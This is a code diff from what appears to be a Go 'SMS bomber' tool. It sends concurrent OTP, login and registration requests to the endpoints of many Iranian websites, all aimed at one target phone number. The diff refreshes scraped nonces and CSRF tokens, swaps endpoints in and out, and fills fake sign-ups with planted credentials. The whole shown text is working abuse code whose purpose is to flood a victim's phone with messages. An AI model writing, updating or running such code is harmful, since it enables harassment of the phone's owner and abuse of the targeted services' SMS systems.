@@ -500,6 +500,7 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
+				formData.Set("ByCode", "ورود با کد یک‌بارمصرف")
 				formData.Set("Step", "EnterMobile")
 				formData.Set("Mobile", phone)
 				formData.Set("Password", "")    
@@ -514,50 +515,43 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("action", "ehraz_sms_otp_phone_verify")
-				formData.Set("phone_number", phone) 
 				formData.Set("login_method", "code")
+				formData.Set("phone_number", phone) 
+				formData.Set("action", "ehraz_sms_otp_phone_verify")
+				formData.Set("ehraz_nonce", "7e44e723bd") 
 				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
-		// irangan.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("mobile", phone) 
-				formData.Set("email", "")   
-				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
-			}
-		}(client)
+
 		// oldpanel.avalpardakht.com 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
+					"email":             "codedbymonsmain@gmail.com", 
+					"is_business":       0, 
 					"mobile":            phone, 
-					"email":             "randomuser@example.com", 
+					"online_chat_token":     "", 
 					"password":          "SecurePass123!", 
 					"rules":             true,
-					"is_business":       0,
-					"online_chat_token": "", 
 				}
 				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
 			}
 		}(client)
 
-		//masterkala.com 
+		//masterkala.com  delete ❌
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
 				payload := map[string]interface{}{
-					"type": "sendotp",
 					"phone": phone,
+					"type": "sendotp",
 				}
 				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
 			}
 		}(client)
+
   // naabshop.com 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -574,7 +568,7 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("signup_otp_mode", "1")
 				formData.Set("rememberme", "1")
 				formData.Set("digits", "1")
-				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
+				formData.Set("instance_id", "6ecab4b3cccd3725e942ca7219014764") 
 				formData.Set("action", "digits_forms_ajax")
 				formData.Set("type", "login")
 				formData.Set("digits_step_1_type", "")
@@ -584,9 +578,9 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("digits_step_3_type", "")
 				formData.Set("digits_step_3_value", "")
 				formData.Set("digits_login_email_token", "")
-				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
-				formData.Set("digits_form", "28e10ee7bd")
-				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("digits_redirect_page", "//naabshop.com/") 
+				formData.Set("digits_form", "18751deacf")
+				formData.Set("_wp_http_referer", "/") 
 				formData.Set("show_force_title", "1")
 				formData.Set("container", "digits_protected")
 				formData.Set("sub_action", "sms_otp")
@@ -594,17 +588,8 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
-                //operator-100.ir
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("email", phone)
-				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
-			}
-		}(client)
 
-		// itmall.ir (Form)
+		// itmall.ir (Form)  delete❌
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -612,7 +597,7 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("action", "digits_check_mob")
 				formData.Set("countrycode", "+98")
 				formData.Set("mobileNo", phone)
-				formData.Set("csrf", "e57d035242")
+				formData.Set("csrf", "55e2fb3616")
 				formData.Set("login", "2")
 				formData.Set("username", "")
 				formData.Set("email", "")
@@ -624,45 +609,17 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// Mobinnet (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch) 
-			}
-		}(client)
-
-		// api.ostadkr.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) 
-
 		// see5.net (Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
 				formData.Set("mobile", phone)
-				formData.Set("name", "sfsfsfsffsf")
-				formData.Set("demo", "bz_sh_fzltprxh")
+				formData.Set("name", "monsmain")
+				formData.Set("demo", "bz_sh_template05")
 				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
 			}
 		}(client) 
-
-		// iranicard.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client)
 
 		// miare.ir (JSON)
 		wg.Add(1)
@@ -787,6 +744,16 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("action", "logini_first")
 				formData.Set("login", phone)
 				sendFormRequest(c, ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// api.ostadkr.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
 			}
 		}(client) 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
